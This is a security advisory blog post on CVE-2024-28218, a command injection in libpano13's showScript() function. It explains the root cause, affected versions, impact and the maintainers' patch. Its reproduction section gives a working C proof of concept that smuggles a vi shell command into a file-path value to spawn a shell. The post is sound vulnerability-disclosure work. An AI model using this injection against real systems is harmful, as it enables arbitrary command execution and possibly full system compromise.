<!DOCTYPE html>
<html
  lang="en"
  data-theme="light"
>
  <head>
     <title> @iosifache | CVE-2024-28218 </title>

    <meta charset="utf-8" />
    <meta name="generator" content="Pelican" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/@picocss/pico@1/css/pico.min.css"
    />
    <link rel="stylesheet" href="/theme/css/style.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@100;300;400;500;700;800&display=swap"
      rel="stylesheet"
    />

    <link rel="icon" href="/theme/images/favicon.png" type="image/x-icon" />
           <meta name="tags" content="vulnerability-discovery" />
<meta name="tags" content="open-source" />
   </head>

  <body>
    <main class="container">
      <nav>
        <ul>
          <li>
            <strong>
              <a href="/"
                >@iosifache</a
              >
            </strong>
          </li>
        </ul>
        <ul>
          <li><a href="/">Articles</a></li>
          <li><a href="/oss">Open source</a></li>
          <li><a href="/talks">Talks</a></li>
          <li><a href="/podcasts">Podcasts</a></li>
          <li><a href="/about">About</a></li>
          <li><a href="/now">Now</a></li>
        </ul>
      </nav>
<h1 class="entry-title">
  <a
    href="/CVE-2024-28218.html"
    rel="bookmark"
    title="Permalink to CVE-2024-28218"
    >CVE-2024-28218</a
  >
</h1>
<div class="post-info">
  <b>Last updated</b>:
  <time class="published" datetime="2024-03-08T00:00:00+02:00">
    Fri 08 March 2024
  </time>
    <div class="tags">
    <b>Tags</b>:     <a href="/tag/vulnerability-discovery.html"
      ><small class="chip">vulnerability-discovery</small></a
    >
    <a href="/tag/open-source.html"
      ><small class="chip">open-source</small></a
    >
  </div>
</div>
<br /><br />
<h1>Summary</h1>
<p>A command injection in <code>showScript()</code> in <code>libpano13</code> <code>0.1</code> through <code>2.9.21</code> allows context-dependent attackers to execute arbitrary commands via the function's parameters.</p>
<h1>Root cause analysis</h1>
<p><code>showScript</code> is a function implemented by <code>libpano13</code>, but dependent on the operating system. Therefore, there are multiple implementations for MacOS, Windows, ANSI and X11. The last three are vulnerable to command injection, as they are executing commands built by using the unsanitized input given as a parameter.</p>
<p>Taking the X11 implementation as an example, it can be seen that the <code>name</code> member of the <code>fullPath</code> structure is directly placed into the <code>vi</code> command. The latter is executed with <code>system</code>.</p>
<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">showScript</span><span class="p">(</span><span class="n">fullPath</span><span class="o">*</span><span class="w"> </span><span class="n">scriptFile</span><span class="p">){</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">cmd</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">fullPath</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">16</span><span class="p">];</span>

<span class="w">    </span><span class="n">snprintf</span><span class="p">(</span><span class="w"> </span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;vi </span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">scriptFile</span><span class="o">-&gt;</span><span class="n">name</span><span class="w"> </span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">system</span><span class="p">(</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">PrintError</span><span class="p">(</span><span class="s">&quot;Unable to execute script editor&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<h1>CWEs</h1>
<ul>
<li>CWE-77: Improper Neutralization of Special Elements Used in a Command ('Command Injection')</li>
</ul>
<h1>Affected components releases</h1>
<p>The <code>showScript</code> function, exposed in <code>libpano13</code>'s <code>filter.h</code>, is affected.</p>
<p>The vulnerable code snippets were introduced in the first revision for ANSI and Windows, and in the 14th revision for X11. All were released in December 2003, so the affected releases started from <code>0.1</code>.</p>
<p>The vulnerability was patched in <code>3005eda747af</code> and <code>61865cbe74ba</code> by replacing the vulnerable function with a stub. These commits are embedded in the <code>2.9.22</code> release.</p>
<p>This being said, the versions are those between <code>&gt;=0.1</code> and <code>&lt;=2.9.21</code> are affected.</p>
<h1>Attack vector</h1>
<p>An attacker must attack an application linking <code>libpano13</code> and control the parameter provided to the <code>showScript</code> function (for example, via command line arguments) to exploit the vulnerability.</p>
<h1>Impact</h1>
<p>The impact depends on how pano13 is integrated into the end application. If the end application calls <code>showScript</code> with a user-controlled <code>fullPath</code>, then the attacker is able to run arbitrary commands under the user on which the application's process was created. If the application is owned by <code>root</code> and has the SUID bit set, the vulnerability leads to full system compromise.</p>
<h1>CVSS v3.1 vector</h1>
<ul>
<li>Vector: <code>AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></li>
<li>Base score: 8.4</li>
</ul>
<h1>Steps to reproduce</h1>
<p>Compile the following program with <code>gcc pano.c -lpano13  -o pano</code>. A shell will be spawned for the user under which the program is executed.</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;pano13/filter.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">fullPath</span><span class="w"> </span><span class="o">*</span><span class="n">outFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">fullPath</span><span class="p">));</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">cmd</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">fullPath</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">16</span><span class="p">];</span>

<span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;vi </span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/tmp/</span><span class="se">\&quot;</span><span class="s"> --cmd </span><span class="se">\&quot;</span><span class="s">:set shell=sh|:shell&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] The executed command will be: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">);</span>

<span class="w">  </span><span class="n">StringtoFullPath</span><span class="p">(</span><span class="n">outFile</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="s">&quot;/tmp/</span><span class="se">\&quot;</span><span class="s"> --cmd </span><span class="se">\&quot;</span><span class="s">:set shell=sh|:shell&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">showScript</span><span class="p">(</span><span class="n">outFile</span><span class="p">);</span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<h1>Patch</h1>
<h2>Recommended to the maintainers</h2>
<p>As <code>showScript</code> takes a <code>fullPath</code> structure as a first parameter, a sanitisation method (such as <code>realpath</code>) can be called in <code>fullPath</code>'s constructors, <code>StringtoFullPath</code> and <code>jpathTofullPath</code>.</p>
<h2>Applied by the maintainers</h2>
<p>The vulnerability was patched in <a class="external-links" href="https://sourceforge.net/p/panotools/libpano13/ci/3005eda747afbb652ce9a5791b7c297ef4104dd2/">the commit <code>3005ed</code></a> by removing the <code>showScript</code> function.</p>
<p>The patch was made available to the users in <a class="external-links" href="https://sourceforge.net/projects/panotools/files/libpano13/libpano13-2.9.22/">the <code>2.9.22</code> release</a>.</p>     </main>
  </body>
</html>